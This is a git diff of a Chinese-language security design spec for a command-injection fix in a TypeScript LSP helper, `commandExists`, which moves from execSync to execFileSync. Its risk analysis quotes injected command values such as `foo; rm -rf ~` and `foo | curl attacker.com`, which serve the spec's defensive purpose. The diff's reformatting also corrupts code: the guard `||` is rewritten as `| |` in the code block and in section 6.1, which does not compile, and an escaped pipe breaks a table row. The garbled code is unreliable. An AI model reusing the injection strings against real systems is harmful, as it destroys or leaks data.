@@ -29,13 +29,13 @@ export function commandExists(command: string): boolean
 ### Input
 
 | 参数 | 类型 | 来源 | 约束 |
-|------|------|------|------|
+| ------ | ------ | ------ | ------ |
 | `command` | `string` | `LSP_SERVERS[key].command` 的静态内置值 | 来自模块内常量，**当前版本不接受用户运行时输入** |
 
 ### Output
 
 | 返回值 | 含义 |
-|--------|------|
+| -------- | ------ |
 | `true` | 命令在 PATH 中存在 |
 | `false` | 命令不存在，或执行 `which`/`where` 本身失败 |
 
@@ -90,9 +90,11 @@ export function commandExists(command: string): boolean {
 }
 ```
 
-**风险分析**：如果 `command` 包含 shell 元字符（如 `;`、`|`、`&&`、`$()`），`execSync` 会将整个字符串传给 shell 解析执行，产生命令注入。例如：
-- `command = "foo; rm -rf ~"` 在 Linux 会执行删除命令
-- `command = "foo | curl attacker.com"` 会产生数据外泄
+**风险分析**：如果 `command` 包含 shell 元字符（如 `;`、` | `、`&&`、`$()`），`execSync` 会将整个字符串传给 shell 解析执行，产生命令注入。例如：
+
+* `command = "foo; rm -rf ~"` 在 Linux 会执行删除命令
+
+* `command = "foo | curl attacker.com"` 会产生数据外泄
 
 ### 4.2 修复方案（伪代码级别）
 
@@ -158,7 +160,7 @@ export function commandExists(command: string): boolean {
  */
 export function commandExists(command: string): boolean {
   // Guard: reject empty or whitespace-only command to avoid ambiguous behavior
-  if (!command || !command.trim()) {
+  if (!command | | !command.trim()) {
     return false;
   }
   try {
@@ -175,7 +177,7 @@ export function commandExists(command: string): boolean {
 ### 4.4 变更范围确认
 
 | 文件 | 行范围 | 变更类型 |
-|------|--------|----------|
+| ------ | -------- | ---------- |
 | `src/tools/lsp/servers.ts` | 第 8 行 | `import { execSync }` -> `import { execFileSync }` |
 | `src/tools/lsp/servers.ts` | 第 152-163 行 | 函数体替换 + 安全注释 |
 
@@ -280,15 +282,16 @@ THEN: 返回数组中 typescript 条目的 installed = true
 
 ### 6.1 command 为空字符串
 
-- `execFileSync('which', [''])` 在 Linux 上行为不确定（某些系统返回非零码，某些报错）
-- 防御性前置检查 `if (!command || !command.trim()) return false` 统一处理
+* `execFileSync('which', [''])` 在 Linux 上行为不确定（某些系统返回非零码，某些报错）
+
+* 防御性前置检查 `if (!command | | !command.trim()) return false` 统一处理
 
 ### 6.2 command 含特殊字符（shell 元字符）
 
 | 字符 | 旧实现 execSync 风险 | 新实现 execFileSync 行为 |
-|------|----------------------|--------------------------|
+| ------ | ---------------------- | -------------------------- |
 | `;` 分号 | 执行后续命令 | 作为字面字符传给 which，查找失败返回 false |
-| `\|` 管道 | 执行管道命令 | 同上 |
+| `\ | ` 管道 | 执行管道命令 | 同上 |
 | `&&` | 短路执行 | 同上 |
 | `$()` | 命令替换 | 同上 |
 | 空格 | 拆分为多个参数 | 整体作为一个参数名称，which 查找失败 |
@@ -297,8 +300,10 @@ THEN: 返回数组中 typescript 条目的 installed = true
 ### 6.3 Windows `where` 的特殊行为
 
 Windows `where` 命令：
-- 支持通配符（如 `where *.exe`），但 `execFileSync` 不经 shell 展开，通配符作为字面量传入，行为安全
-- 返回所有匹配路径（多行），对 `commandExists` 只关心退出码，`stdio: 'ignore'` 无影响
+
+* 支持通配符（如 `where *.exe`），但 `execFileSync` 不经 shell 展开，通配符作为字面量传入，行为安全
+
+* 返回所有匹配路径（多行），对 `commandExists` 只关心退出码，`stdio: 'ignore'` 无影响
 
 ### 6.4 `execFileSync` 可用性
 
@@ -355,13 +360,17 @@ Feature: commandExists shell 注入修复
 按 Axiom CI Gate 规则，实现完成后必须执行：
 
 ```bash
+
 # 1. TypeScript 编译检查
+
 tsc --noEmit
 
 # 2. 构建验证
+
 npm run build
 
 # 3. 单元测试
+
 npm test -- src/tools/lsp/__tests__/
 ```
 
@@ -371,6 +380,8 @@ npm test -- src/tools/lsp/__tests__/
 
 ## 9. 不在本次范围内
 
-- 不修改 `LspClient`、`LspClientManager`、`getServerForFile`、`getServerForLanguage`
-- 不引入用户自定义 LSP 服务器的白名单机制（若未来需要，需新建独立任务）
-- 不修改 `client.ts` 中 `spawn` 的 `shell` 选项（已由 T-? 处理）
+* 不修改 `LspClient`、`LspClientManager`、`getServerForFile`、`getServerForLanguage`
+
+* 不引入用户自定义 LSP 服务器的白名单机制（若未来需要，需新建独立任务）
+
+* 不修改 `client.ts` 中 `spawn` 的 `shell` 选项（已由 T-? 处理）
